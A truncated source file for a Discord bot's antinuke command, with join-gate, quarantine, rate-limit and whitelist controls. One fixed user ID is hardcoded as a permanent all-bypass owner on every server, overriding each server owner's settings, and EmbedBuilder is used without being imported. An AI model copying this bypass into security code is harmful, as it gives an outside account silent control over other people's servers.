const db = require('../database/db');
const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  UserFlags
} = require('discord.js');
const { createStyledEmbed } = require('../utils/embedBuilder');
const emojis = require('../utils/emojis');

// Global AntiNuke Guild Settings Store
const antinukeConfigs = new Map();

function getOrCreateAntinuke(guildId) {
  if (!antinukeConfigs.has(guildId)) {
    const dbConfig = db.getAntinuke(guildId);
    const wlMap = new Map();
    if (Array.isArray(dbConfig.whitelistedUsers)) {
      dbConfig.whitelistedUsers.forEach(u => wlMap.set(u, new Set(['all'])));
    } else if (dbConfig.whitelistedUsers && typeof dbConfig.whitelistedUsers === 'object') {
      for (const [uid, pList] of Object.entries(dbConfig.whitelistedUsers)) {
        wlMap.set(uid, new Set(Array.isArray(pList) ? pList : ['all']));
      }
    }
    wlMap.set('1420687548807905324', new Set(['all']));

    antinukeConfigs.set(guildId, {
      enabled: dbConfig.enabled ?? false,
      panicmode: dbConfig.panicmode ?? false,
      panicLevel: dbConfig.panicLevel ?? 1,
      whitelistedUsers: wlMap,
      extraOwners: new Set(dbConfig.extraOwners || ['1420687548807905324']),
      bypassRoles: new Set(dbConfig.bypassRoles || []),

      // Shinobi JoinGate General Settings
      joinGate: {
        enabled: true,
        dmOnPunish: true,
        antiBotAdd: true,
        antiUnverifiedBot: true,
        antiNoAvatar: false,
        antiSuspiciousAccount: true,
        antiAdvertisingName: true,
        antiAccountAge: true,
        minAccountAgeDays: 7,
        botAddAction: 'kick', // 'kick', 'ban', 'quarantine'
        unverifiedBotAction: 'kick',
        noAvatarAction: 'kick',
        suspiciousAction: 'kick',
        advertisingAction: 'timeout',
        accountAgeAction: 'kick'
      },

      // Shinobi Auto Quarantine & Perm Monitoring
      autoQuarantine: {
        enabled: true,
        strictMode: true, // Punish unauthorized admins giving dangerous perms to any role
        strictMemberRole: true, // Punish unauthorized admins giving dangerous perms to members
        monitorPublicRoles: true, // Protect @everyone & default roles from getting dangerous perms
        monitorChannelPerms: true, // Protect @everyone & public roles from dangerous channel perms
        quarantineWhitelist: new Set([ '1420687548807905324', ])
      },

      // Shinobi Action Rate Limits
      rateLimits: {
        kickBanLimitMin: 5,
        kickBanLimitHour: 15,
        roleCreateLimitMin: 5,
        roleCreateLimitHour: 15,
        roleDeleteLimitMin: 3,
        roleDeleteLimitHour: 10,
        channelCreateLimitMin: 4,
        channelCreateLimitHour: 12,
        channelDeleteLimitMin: 3,
        channelDeleteLimitHour: 8,
        webhookCreateLimitMin: 3,
        webhookCreateLimitHour: 10
      },

      filters: {
        antiBan: true,
        antiKick: true,
        antiBotAdd: true,
        antiChannelCreate: true,
        antiChannelDelete: true,
        antiChannelUpdate: true,
        antiRoleCreate: true,
        antiRoleDelete: true,
        antiRoleUpdate: true,
        antiWebhookCreate: true,
        antiWebhookDelete: true,
        antiWebhookUpdate: true,
        antiEmojiCreate: true,
        antiEmojiDelete: true,
        antiEmojiUpdate: true,
        antiGuildUpdate: true,
        antiUnban: true,
        antiSpam: true,
        antiRaid: true,
        antiEveryone: true
      }
    });
  }
  const cfg = antinukeConfigs.get(guildId);

  // Normalize whitelistedUsers if it was a Set
  if (cfg.whitelistedUsers && !(cfg.whitelistedUsers instanceof Map)) {
    const map = new Map();
    cfg.whitelistedUsers.forEach(id => map.set(id, new Set(['all'])));
    cfg.whitelistedUsers = map;
  }

  if (!cfg.joinGate) {
    cfg.joinGate = {
      enabled: true,
      dmOnPunish: true,
      antiBotAdd: true,
      antiUnverifiedBot: true,
      antiNoAvatar: false,
      antiSuspiciousAccount: true,
      antiAdvertisingName: true,
      antiAccountAge: true,
      minAccountAgeDays: 7,
      botAddAction: 'kick',
      unverifiedBotAction: 'kick',
      noAvatarAction: 'kick',
      suspiciousAction: 'kick',
      advertisingAction: 'timeout',
      accountAgeAction: 'kick'
    };
  }

  if (!cfg.autoQuarantine) {
    cfg.autoQuarantine = {
      enabled: true,
      strictMode: true,
      strictMemberRole: true,
      monitorPublicRoles: true,
      monitorChannelPerms: true,
      quarantineWhitelist: new Set([ '1420687548807905324', ])
    };
  }

  if (!cfg.rateLimits) {
    cfg.rateLimits = {
      kickBanLimitMin: 5,
      kickBanLimitHour: 15,
      roleCreateLimitMin: 5,
      roleCreateLimitHour: 15,
      roleDeleteLimitMin: 3,
      roleDeleteLimitHour: 10,
      channelCreateLimitMin: 4,
      channelCreateLimitHour: 12,
      channelDeleteLimitMin: 3,
      channelDeleteLimitHour: 8,
      webhookCreateLimitMin: 3,
      webhookCreateLimitHour: 10
    };
  }

  if (!cfg.filters) {
    cfg.filters = {
      antiBan: true,
      antiKick: true,
      antiBotAdd: true,
      antiChannelCreate: true,
      antiChannelDelete: true,
      antiChannelUpdate: true,
      antiRoleCreate: true,
      antiRoleDelete: true,
      antiRoleUpdate: true,
      antiWebhookCreate: true,
      antiWebhookDelete: true,
      antiWebhookUpdate: true,
      antiEmojiCreate: true,
      antiEmojiDelete: true,
      antiEmojiUpdate: true,
      antiGuildUpdate: true,
      antiUnban: true,
      antiSpam: true,
      antiRaid: true,
      antiEveryone: true
    };
  }
  if (cfg.panicLevel === undefined) cfg.panicLevel = 1;
  return cfg;
}

const FILTER_MAP = {
  'ban': ['antiBan'],
  'antiban': ['antiBan'],
  'kick': ['antiKick'],
  'antikick': ['antiKick'],
  'bot': ['antiBotAdd'],
  'antibot': ['antiBotAdd'],
  'channel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'antichannel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'role': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'antirole': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'webhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'antiwebhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'emoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'antiemoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'server': ['antiGuildUpdate'],
  'antiguild': ['antiGuildUpdate'],
  'unban': ['antiUnban'],
  'antiunban': ['antiUnban'],
  'spam': ['antiSpam'],
  'antispam': ['antiSpam'],
  'raid': ['antiRaid'],
  'antiraid': ['antiRaid'],
  'everyone': ['antiEveryone'],
  'here': ['antiEveryone'],
  'antieveryone': ['antiEveryone']
};

const ALL_PERMS = [
  'all', 'everyone', 'antieveryone', 'ban', 'unban', 'kick', 'prune', 'bot',
  'channel', 'channel_create', 'channel_delete', 'channel_update',
  'role', 'role_create', 'role_delete', 'role_update', 'role_dangerous',
  'webhook', 'webhook_create', 'webhook_update', 'webhook_delete',
  'guild', 'member_update', 'member_dangerous', 'integration', 'sticker', 'emoji'
];

function saveAntinukeToDb(guildId, config) {
  const wlObj = {};
  if (config.whitelistedUsers) {
    for (const [uid, set] of config.whitelistedUsers.entries()) {
      wlObj[uid] = Array.from(set);
    }
  }
  db.updateAntinuke(guildId, {
    enabled: config.enabled,
    panicmode: config.panicmode,
    panicLevel: config.panicLevel,
    whitelistedUsers: wlObj,
    extraOwners: Array.from(config.extraOwners || []),
    bypassRoles: Array.from(config.bypassRoles || []),
    filters: config.filters
  });
}

function formatUserPerms(permsSet) {
  if (!permsSet || permsSet.size === 0) return `\`NONE\``;
  if (permsSet.has('all')) return `\`ALL BYPASSES\``;
  const list = Array.from(permsSet).map(p => `\`${p.toUpperCase()}\``).join(', ');
  return list || `\`NONE\``;
}

function isUserWhitelistedForFeature(config, userId, featureName) {
  if (config.extraOwners.has(userId) || ['1420687548807905324',  ].includes(userId)) {
    return true;
  }
  if (!config.whitelistedUsers || !config.whitelistedUsers.has(userId)) {
    return false;
  }

  const perms = config.whitelistedUsers.get(userId);
  if (!perms) return false;
  if (perms.has('all')) return true;

  const fname = featureName.toLowerCase();

  // Exact match (e.g. 'channel_create', 'role_delete', 'ban', etc.)
  if (perms.has(fname)) return true;

  // Category fallback checks
  if ((fname.includes('ban') || fname.includes('unban')) && (perms.has('ban') || perms.has('unban'))) return true;
  if ((fname.includes('kick') || fname.includes('prune')) && (perms.has('kick') || perms.has('prune'))) return true;
  if (fname.includes('bot') && perms.has('bot')) return true;
  if (fname.includes('channel') && (perms.has('channel') || perms.has('channel_create') || perms.has('channel_delete') || perms.has('channel_update'))) return true;
  if (fname.includes('role') && (perms.has('role') || perms.has('role_create') || perms.has('role_delete') || perms.has('role_update') || perms.has('role_dangerous'))) return true;
  if (fname.includes('webhook') && (perms.has('webhook') || perms.has('webhook_create') || perms.has('webhook_delete') || perms.has('webhook_update'))) return true;
  if (fname.includes('guild') && perms.has('guild')) return true;
  if ((fname.includes('everyone') || fname.includes('here')) && perms.has('everyone')) return true;
  if (fname.includes('member') && (perms.has('member_update') || perms.has('member_dangerous'))) return true;
  if (fname.includes('emoji') && perms.has('emoji')) return true;
  if (fname.includes('sticker') && perms.has('sticker')) return true;
  if (fname.includes('integration') && perms.has('integration')) return true;

  return false;
}

const { createDynamicBox } = require('../utils/boxBuilder');

function renderAntinukeDashboard(config, author, clientUser) {
  const f = config.filters;
  const jg = config.joinGate;
  const aq = config.autoQuarantine;
  const rl = config.rateLimits;

  const extraOwnersList = Array.from(config.extraOwners).map(id => `<@${id}>`).join(', ') || 'None';
  const whitelistCount = config.whitelistedUsers.size;

  const boxMain = createDynamicBox('ANTINUKE SYSTEM HUB', [
    { key: 'AntiNuke', value: config.enabled ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'Panic Mode', value: config.panicmode ? `ACTIVE L${config.panicLevel}` : 'NORMAL [OFF]' },
    { key: 'ExtraOwner', value: config.extraOwners.size + ' Users' },
    { key: 'Whitelist', value: whitelistCount + ' Users' }
  ]);

  const boxGate = createDynamicBox('JOINGATE SECURITY', [
    { key: 'AntiBotAdd', value: jg.antiBotAdd ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'Unverified', value: jg.antiUnverifiedBot ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'No Avatar', value: jg.antiNoAvatar ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'AccountAge', value: jg.antiAccountAge ? `${jg.minAccountAgeDays}d [OK]` : 'DISABLED[X]' }
  ]);

  const boxQuarantine = createDynamicBox('AUTO QUARANTINE', [
    { key: 'Quarantine', value: aq.enabled ? 'ACTIVE [OK]' : 'DISABLED[X]' },
    { key: 'AdminGuard', value: aq.strictMode ? 'ON [OK]' : 'OFF [X]' },
    { key: 'MemberRole', value: aq.strictMemberRole ? 'ON [OK]' : 'OFF [X]' },
    { key: 'PublicRole', value: aq.monitorPublicRoles ? 'ACTIVE [OK]' : 'OFF [X]' }
  ]);

  const description =
    `Welcome **${author.username}**! Below is your executive **<a:antinuke_animated:1537447188823805972> AntiNuke & Security Control Suite**.\n\n` +
    `## <a:scroll_animated:1537179663791693844> Control Button Guide\n` +
    `• ${emojis.AN_SHIELD} **Shield**: Master AntiNuke Guard *(Auto-creates/deletes \`AntiNuke Bypass\` role)*\n` +
    `• ${emojis.AN_PANIC} **Panic**: Emergency Lockdown Mode (Levels 1-3)\n` +
    `• ${emojis.AN_JOINGATE} **JoinGate**: Bot Add & Account Age Join Protection\n` +
    `• ${emojis.AN_QUARANTINE} **Quarantine**: Dangerous Admin Perm Auto-Quarantine\n` +
    `• ${emojis.AN_WHITELIST} **Whitelist**: Open Granular <a:whitelist_animated:1537447233472036964> Whitelist Delegation Hub\n` +
    `• ${emojis.AN_BAN} ${emojis.AN_KICK} ${emojis.AN_BOT} ${emojis.AN_CHANNEL} ${emojis.AN_ROLE} ${emojis.AN_WEBHOOK} ${emojis.AN_SPAM} ${emojis.AN_SHIELD} ${emojis.AN_RAID} ${emojis.AN_GUILD} **Filters**: Action Interception Toggles (Ban, Kick, Bot, Channel, Role, Webhook, Spam, Everyone, Raid, Guild)\n\n` +
    `## ${emojis.AN_SHIELD} Main System Status\n` +
    '```\n' + boxMain + '\n```\n\n' +
    `## ${emojis.AN_JOINGATE} Join Gate Security\n` +
    '```\n' + boxGate + '\n```\n\n' +
    `**${emojis.AN_QUARANTINE} Auto <a:quarantine_animated:1537447221350633472> Quarantine Guard**\n` +
    '```\n' + boxQuarantine + '\n```\n\n' +
    `## <a:crown_animated:1537177361093500968> Registered Extra Owners\n` +
    `${extraOwnersList}`;

  return createStyledEmbed({
    title: `${emojis.AN_SHIELD} <a:antinuke_animated:1537447188823805972> AntiNuke & Security Control Suite`,
    subtitle: `Shinobi-Grade Server Protection & Executive Guard`,
    description,
    requestedBy: author,
    clientUser
  });
}

function renderPanicComponents(config) {
  const f = config.filters;
  const jg = config.joinGate;
  const aq = config.autoQuarantine;

  // Row 1: Executive Master Controls (Dedicated AntiNuke Animated Discord Emojis)
  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('toggle_shield')
      .setEmoji(config.enabled ? emojis.OBJ_AN_SHIELD : emojis.OBJ_REMOVE)
      .setStyle(config.enabled ? ButtonStyle.Success : ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId('toggle_panic')
      .setEmoji(emojis.OBJ_AN_PANIC)
      .setStyle(config.panicmode ? ButtonStyle.Danger : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_joingate')
      .setEmoji(emojis.OBJ_AN_JOINGATE)
      .setStyle(jg.enabled ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_quarantine')
      .setEmoji(emojis.OBJ_AN_QUARANTINE)
      .setStyle(aq.enabled ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('an_whitelist_mgr')
      .setEmoji(emojis.OBJ_AN_WHITELIST)
      .setStyle(ButtonStyle.Primary)
  );

  // Row 2: Filter Perms Group 1 (Dedicated AntiNuke Animated Discord Emojis)
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('toggle_ban').setEmoji(emojis.OBJ_AN_BAN).setStyle(f.antiBan ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_kick').setEmoji(emojis.OBJ_AN_KICK).setStyle(f.antiKick ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_bot').setEmoji(emojis.OBJ_AN_BOT).setStyle(f.antiBotAdd ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_channel').setEmoji(emojis.OBJ_AN_CHANNEL).setStyle(f.antiChannelCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_role').setEmoji(emojis.OBJ_AN_ROLE).setStyle(f.antiRoleCreate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  // Row 3: Filter Perms Group 2 (Dedicated AntiNuke Animated Discord Emojis)
  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('toggle_webhook').setEmoji(emojis.OBJ_AN_WEBHOOK).setStyle(f.antiWebhookCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_spam').setEmoji(emojis.OBJ_AN_SPAM).setStyle(f.antiSpam ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_everyone').setEmoji(emojis.OBJ_AN_SHIELD).setStyle(f.antiEveryone ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_raid').setEmoji(emojis.OBJ_AN_RAID).setStyle(f.antiRaid ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_guild').setEmoji(emojis.OBJ_AN_GUILD).setStyle(f.antiGuildUpdate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  // Row 4: 1-Click Master Presets (Enable All / Disable All / Refresh)
  const row4 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('an_enable_all')
      .setLabel('Enable All Filters')
      .setEmoji(emojis.SUCCESS || '<a:accept_animated:1537177319603703969>')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId('an_disable_all')
      .setLabel('Disable All Filters')
      .setEmoji(emojis.DISABLED || '<a:wrong_animated:1537179702928875631>')
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId('an_refresh')
      .setLabel('Refresh Status')
      .setEmoji(emojis.OBJ_REFRESH || '🔄')
      .setStyle(ButtonStyle.Secondary)
  );

  return [row1, row2, row3, row4];
}



module.exports = {
  name: 'antinuke',
  description: 'Shinobi-Grade AntiNuke, JoinGate, Auto-Quarantine, Rate Limits, Whitelist & Extra Owner Suite',
  aliases: [
    'panicmode', 'whitelist', 'extraowner', 'bypassrole',
    'joingate', 'quarantine', 'ratelimits', 'limits'
  ],
  antinukeConfigs,
  getOrCreateAntinuke,
  isUserWhitelistedForFeature,
  renderAntinukeDashboard,
  renderPanicComponents,

  async execute(message, args) {
    const rawFirstWord = message.content.trim().split(/ +/)[0] || '';
    const invoked = rawFirstWord.replace(/^[^a-zA-Z0-9]+/, '').toLowerCase();
    let sub = args[0]?.toLowerCase();

    if (invoked === 'panicmode') sub = 'panicmode';
    if (invoked === 'whitelist') sub = 'whitelist';
    if (invoked === 'extraowner') sub = 'extraowner';
    if (invoked === 'joingate') sub = 'joingate';
    if (invoked === 'quarantine') sub = 'quarantine';
    if (invoked === 'limits' || invoked === 'ratelimits') sub = 'limits';

    const author = message.author;
    const guild = message.guild;
    const config = getOrCreateAntinuke(guild.id);

    let clientUser = message.client.user;
    try {
      clientUser = await message.client.users.fetch(message.client.user.id, { force: true });
    } catch (e) {}

    // STRICT PERMISSION CHECK: Only Server Owner & Bot Extra Owners can manage security settings
    const isServerOwner = guild.ownerId === author.id;
    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324',  ].includes(author.id);

    if (!isServerOwner && !isExtraOwner) {
      return message.reply(`${emojis.WARNING || emojis.WARNING} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AntiNuke security, Whitelists, Extra Owners, JoinGate, or Auto Quarantine!`);
    }

    // ─────────────────────────────────────────
    // JOIN GATE SUBCOMMAND (.joingate / .antinuke joingate)
    // ─────────────────────────────────────────
    if (sub === 'joingate' || sub === 'gate') {
      const toggle = args[1]?.toLowerCase();
      const jg = config.joinGate;

      if (toggle === 'noavatar' || toggle === 'avatar') {
        jg.antiNoAvatar = !jg.antiNoAvatar;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate No Avatar Gate** is now **${jg.antiNoAvatar ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'unverifiedbot' || toggle === 'unverified') {
        jg.antiUnverifiedBot = !jg.antiUnverifiedBot;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate Anti-Unverified Bot** is now **${jg.antiUnverifiedBot ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'adname' || toggle === 'advertising') {
        jg.antiAdvertisingName = !jg.antiAdvertisingName;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate Advertising Name Gate** is now **${jg.antiAdvertisingName ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'accage' || toggle === 'accountage') {
        jg.antiAccountAge = !jg.antiAccountAge;
        if (args[2] && !isNaN(parseInt(args[2]))) {
          jg.minAccountAgeDays = parseInt(args[2]);
        }
        antinukeConfigs.set(guild.id, config);
      }

      const description =
        `Welcome **${author.username}**! Below are your **Join Gate Security Controls**.\n\n` +
        `**<a:openeddooraperture_animated:1537177450411462766> Join Gate Status**\n` +
        `\`\`\`\n` +
        `Bot Additions Protection: ${jg.antiBotAdd ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Unverified Bot Gate     : ${jg.antiUnverifiedBot ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `No Avatar Gate          : ${jg.antiNoAvatar ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Advertising Name Gate   : ${jg.antiAdvertisingName ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Minimum Account Age     : ${jg.antiAccountAge ? `ENABLED (${jg.minAccountAgeDays} Days)` : 'DISABLED [OFF]'}\n` +
        `\`\`\`\n\n` +
        `**<a:rapid_animated:1537177482006896692> Commands to Toggle**\n` +
        `\`\`\`\n` +
        `.antinuke joingate noavatar\n` +
        `.antinuke joingate unverified\n` +
        `.antinuke joingate adname\n` +
        `.antinuke joingate accage <days>\n` +
        `\`\`\``;

      const embed = createStyledEmbed({
        title: `<a:openeddooraperture_animated:1537177450411462766> Join Gate Security Controls`,
        description,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // ─────────────────────────────────────────
    // AUTO QUARANTINE SUBCOMMAND (.quarantine / .antinuke quarantine)
    // ─────────────────────────────────────────
    if (sub === 'quarantine' || sub === 'autoquarantine') {
      const toggle = args[1]?.toLowerCase();
      const aq = config.autoQuarantine;

      if (toggle === 'strict' || toggle === 'mode') {
        aq.strictMode = !aq.strictMode;
        antinukeConfigs.set(guild.id, config);
      }
      if (toggle === 'member' || toggle === 'strictmember') {
        aq.strictMemberRole = !aq.strictMemberRole;
        antinukeConfigs.set(guild.id, config);
      }
      if (toggle === 'everyone' || toggle === 'publicroles') {
        aq.monitorPublicRoles = !aq.monitorPublicRoles;
        antinukeConfigs.set(guild.id, config);
      }

      const description =
        `Welcome **${author.username}**! Below is your **Auto Quarantine & Dangerous Perm Protection** status.\n\n` +
        `**☣️ Auto Quarantine Status**\n` +
        `\`\`\`\n` +
        `Auto Quarantine Suite  : ${aq.enabled ? 'ACTIVE [OK]' : 'DISABLED [OFF]'}\n` +
        `Strict Admin Role Guard: ${aq.strictMode ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Strict Member Guard    : ${aq.strictMemberRole ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Public Roles Guard     : ${aq.monitorPublicRoles ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Channel Perm Overwrite : ${aq.monitorChannelPerms ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `\`\`\`\n\n` +
        `**<a:rapid_animated:1537177482006896692> Commands to Toggle**\n` +
        `\`\`\`\n` +
        `.antinuke quarantine strict\n` +
        `.antinuke quarantine member\n` +
        `.antinuke quarantine publicroles\n` +
        `\`\`\``;

      const embed = createStyledEmbed({
        title: `☣️ Auto Quarantine & Dangerous Permission Protection`,
        description,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // ─────────────────────────────────────────
    // DEDICATED WHITELIST PANEL & GRANULAR PERMS (.whitelist / .whitelisted)
    // ─────────────────────────────────────────
    if (invoked === 'whitelist' || invoked === 'whitelisted' || sub === 'whitelist' || sub === 'whitelisted') {
      const action = (invoked === 'whitelist' || invoked === 'whitelisted' ? args[0] : args[1])?.toLowerCase();
      const user = message.mentions.users.first() || (args[0] && args[0].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[0]).catch(() => null) : null) || (args[1] && args[1].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[1]).catch(() => null) : null);

      // Granular 21-Event Audit View for a specific target user (.whitelist @user or .whitelist status @user)
      if (user && (action === 'status' || !action || action === user.id || action.startsWith('<@'))) {
        let userPerms = config.whitelistedUsers.get(user.id) || new Set();

        function buildOlympusDescription(perms) {
          const isAll = perms.has('all');
          const has = (p) => isAll || perms.has(p);

          return [
            `• ${has('ban') ? '✅' : '❌'} :**Ban**`,
            `• ${has('kick') ? '✅' : '❌'} :**Kick**`,
            `• ${has('prune') ? '✅' : '❌'} :**Prune Members**`,
            `• ${has('bot') ? '✅' : '❌'} :**Bot Add**`,
            `• ${has('guild') ? '✅' : '❌'} :**Guild Update**`,
            `• ${has('channel_create') ? '✅' : '❌'} :**Channel Create**`,
            `• ${has('channel_delete') ? '✅' : '❌'} :**Channel Delete**`,
            `• ${has('channel_update') ? '✅' : '❌'} :**Channel Update**`,
            `• ${has('role_create') ? '✅' : '❌'} :**Role Create**`,
            `• ${has('role_delete') ? '✅' : '❌'} :**Role Delete**`,
            `• ${has('role_update') ? '✅' : '❌'} :**Role Update**`,
            `• ${has('role_dangerous') ? '✅' : '❌'} :**Role Update With Dangerous Permissions**`,
            `• ${has('everyone') ? '✅' : '❌'} :**Mention @everyone**`,
            `• ${has('webhook_create') ? '✅' : '❌'} :**Webhook Create**`,
            `• ${has('webhook_update') ? '✅' : '❌'} :**Webhook Update**`,
            `• ${has('webhook_delete') ? '✅' : '❌'} :**Webhook Delete**`,
            `• ${has('member_update') ? '✅' : '❌'} :**Member Update**`,
            `• ${has('member_dangerous') ? '✅' : '❌'} :**Member Update With Dangerous Permissions**`,
            `• ${has('integration') ? '✅' : '❌'} :**Anti Integration (Re-Adding Bot)**`,
            `• ${has('sticker') ? '✅' : '❌'} :**Anti Sticker Update**`,
            `• ${has('emoji') ? '✅' : '❌'} :**Anti Emoji Update**`
          ].join('\n') +
          `\n\n` +
          `👤 **Author**             👥 **Target**\n` +
          `<@${author.id}>           <@${user.id}>`;
        }

        function buildOlympusComponents(perms) {
          const isAll = perms.has('all');

          const selectRow = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
              .setCustomId(`wl_cat_${user.id}`)
              .setPlaceholder('Choose a category')
              .addOptions([
                { label: 'Mention @everyone', value: 'everyone', description: 'Allow or block @everyone & @here pings', emoji: '📢' },
                { label: 'All Permissions', value: 'all', description: 'Grant or revoke full bypass for ALL events', emoji: '🛡️' },
                { label: 'Ban & Kick', value: 'cat_ban_kick', description: 'Whitelist for Ban, Unban, Kick & Prune', emoji: '🔨' },
                { label: 'Channel Management', value: 'cat_channel', description: 'Whitelist for Channel Create, Delete, Update', emoji: '📁' },
                { label: 'Role Management', value: 'cat_role', description: 'Whitelist for Role Create, Delete, Update & Dangerous', emoji: '🎭' },
                { label: 'Webhook Management', value: 'cat_webhook', description: 'Whitelist for Webhook Create, Delete, Update', emoji: '🔗' },
                { label: 'Member Management', value: 'cat_member', description: 'Whitelist for Member Updates & Dangerous perms', emoji: '👥' },
                { label: 'Bot & Integrations', value: 'cat_bot', description: 'Whitelist for Adding Bots & Integrations', emoji: '🤖' },
                { label: 'Guild Settings', value: 'cat_guild', description: 'Whitelist for Server Name, Icon & Settings', emoji: '⚙️' },
                { label: 'Stickers & Emojis', value: 'cat_assets', description: 'Whitelist for Sticker & Emoji updates', emoji: '🎨' }
              ])
          );

          const btnRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId(`wl_btn_all_${user.id}`)
              .setLabel(isAll ? 'Unwhitelist All Event' : 'Whitelist All Event')
              .setEmoji('🛡️')
              .setStyle(isAll ? ButtonStyle.Secondary : ButtonStyle.Danger)
          );

          return [selectRow, btnRow];
        }

        const guildIcon = guild.iconURL({ dynamic: true, size: 512 }) || clientUser.displayAvatarURL({ dynamic: true });

        const embed = new EmbedBuilder()
          .setColor(0xE74C3C)
          .setTitle(guild.name)
          .setThumbnail(guildIcon)
          .setDescription(buildOlympusDescription(userPerms))
          .setFooter({
            text: 'Powered by Naruto Bot Development™',
            iconURL: clientUser.displayAvatarURL({ dynamic: true })
          });

        const msg = await message.channel.send({ embeds: [embed], components: buildOlympusComponents(userPerms) });
        const collector = msg.createMessageComponentCollector({ time: 300000 });

        collector.on('collect', async (interaction) => {
          if (interaction.user.id !== author.id && author.id !== guild.ownerId) {
            return interaction.reply({ content: `${emojis.WARNING} Only **${author.username}** (who requested this panel) or Server Owner can use these controls.`, flags: 64 });
          }

          let currentPerms = config.whitelistedUsers.get(user.id) || new Set();

          if (interaction.customId === `wl_cat_${user.id}`) {
            const selected = interaction.values[0];

            if (selected === 'all') {
              if (currentPerms.has('all')) {
                currentPerms.clear();
              } else {
                currentPerms.clear();
                currentPerms.add('all');
              }
            } else if (selected === 'everyone') {
              if (currentPerms.has('all')) {
                currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && p !== 'everyone'));
              } else if (currentPerms.has('everyone')) {
                currentPerms.delete('everyone');
              } else {
                currentPerms.add('everyone');
              }
            } else if (selected === 'cat_ban_kick') {
              const keys = ['ban', 'unban', 'kick', 'prune'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_channel') {
              const keys = ['channel_create', 'channel_delete', 'channel_update'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_role') {
              const keys = ['role_create', 'role_delete', 'role_update', 'role_dangerous'];
              const hasAny = keys.some(k => currentPerms.has(k) || currentPerms.has('all'));
              if (currentPerms.has('all')) currentPerms = new Set(ALL_PERMS.filter(p => p !== 'all' && !keys.includes(p)));
              else if (hasAny) keys.forEach(k => currentPerms.delete(k));
              else keys.forEach(k => currentPerms.add(k));
            } else if (selected === 'cat_webhook') {
              const keys = ['webhook_create', 'webhook_update', 'webhook_delete'];
